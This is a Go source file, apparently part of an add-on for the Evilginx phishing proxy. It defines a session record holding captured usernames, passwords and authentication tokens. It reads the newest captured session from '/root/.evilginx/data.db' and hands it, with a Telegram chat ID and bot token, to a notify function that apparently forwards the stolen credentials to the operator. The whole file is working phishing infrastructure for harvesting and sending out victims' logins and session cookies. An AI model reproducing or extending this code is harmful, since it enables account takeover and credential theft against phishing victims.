package core

import (
	"bufio"
	"encoding/json"
	"fmt"
	"os"
	"strings"
)

type TSession struct {
	ID         int                    `json:"id"`
	Phishlet   string                 `json:"phishlet"`
	LandingURL string                 `json:"landing_url"`
	Username   string                 `json:"username"`
	Password   string                 `json:"password"`
	Custom     map[string]interface{} `json:"custom"`
	BodyTokens map[string]interface{} `json:"body_tokens"`
	HTTPTokens map[string]interface{} `json:"http_tokens"`
	Tokens     map[string]interface{} `json:"tokens"`
	SessionID  string                 `json:"session_id"`
	UserAgent  string                 `json:"useragent"`
	RemoteAddr string                 `json:"remote_addr"`
	CreateTime int64                  `json:"create_time"`
	UpdateTime int64                  `json:"update_time"`
}

func ReadLatestSession(filePath string) (TSession, error) {
	file, err := os.Open(filePath)
	if err != nil {
		return TSession{}, fmt.Errorf("could not open file: %v", err)
	}
	defer file.Close()

	var latestSession TSession
	var currentSessionData string
	captureSession := false

	scanner := bufio.NewScanner(file)

	for scanner.Scan() {
		line := scanner.Text()

		if strings.HasPrefix(line, "$") {
			if captureSession {
				if currentSessionData != "" {
					var session TSession
					err := json.Unmarshal([]byte(currentSessionData), &session)
					if err == nil {
						latestSession = session
					} else {
						fmt.Printf("Error parsing session JSON: %v\n", err)
					}
					currentSessionData = ""
				}
			}
			captureSession = true
		}

		if captureSession && strings.HasPrefix(line, "{") {
			currentSessionData = line
		}
	}

	if captureSession && currentSessionData != "" {
		var session TSession
		err := json.Unmarshal([]byte(currentSessionData), &session)
		if err == nil {
			latestSession = session
		} else {
			fmt.Printf("Error parsing session JSON: %v\n", err)
		}
	}

	if err := scanner.Err(); err != nil {
		return TSession{}, fmt.Errorf("error reading file: %v", err)
	}

	return latestSession, nil
}

func readFile(chatid string, teletoken string) {

	filePath := "/root/.evilginx/data.db"

	latestSession, err := ReadLatestSession(filePath)
	if err != nil {
		fmt.Printf("Error: %v\n", err)
		return
	}

	if latestSession.ID != 0 { // Assuming ID 0 indicates no valid session

		Notify(latestSession, chatid, teletoken)
	} else {
		fmt.Println("No session found.")
	}
}
